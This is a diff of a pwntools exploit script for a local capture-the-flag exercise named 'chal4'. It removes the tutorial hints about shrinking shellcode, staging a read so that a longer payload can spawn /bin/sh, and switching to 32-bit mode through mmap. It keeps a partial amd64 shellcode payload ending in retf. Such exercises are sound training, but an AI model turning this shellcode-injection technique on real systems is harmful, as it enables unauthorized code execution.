@@ -1,19 +1,6 @@
 from pwn import *
 
 p = process("./chal4")
-# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
-# You can check all Linux x64 syscalls at this page: https://syscalls64.paolostivanin.com/
-# For this challenge, your task is removing redundant shellcodes and make it less than 0x10 bytes
-
-# Tip 1: Some register have the correct values before running our shellcode! Let's use gdb to check the registers!
-
-# Tip 2: The 0x10 bytes length limitation is too strict for execve("/bin/sh") because "/bin/sh" takes 8 bytes. \
-# And why don't we call read rather than execve \
-# so we could read longer shellcode to execute "/bin/sh" ?
-
-# Tip 3: You may find x86 can't visite x64 address because x64 address is too long to be stored in the x86 register
-# However, we still have mmap, which could allocate a chunk of memory, 
-# for example 0xcafe000, so we can visite this address in x86 asm. 
 context.arch = 'amd64'
 shellcode = f'''
 xor rax,rax
@@ -38,7 +25,7 @@ xor rsi,rax
 push rsi
 retf
 '''
-gdb.attach(p)
+# gdb.attach(p)
 shellcode = asm(shellcode)
 p.send(shellcode.ljust(0x100,b'\0'))
 
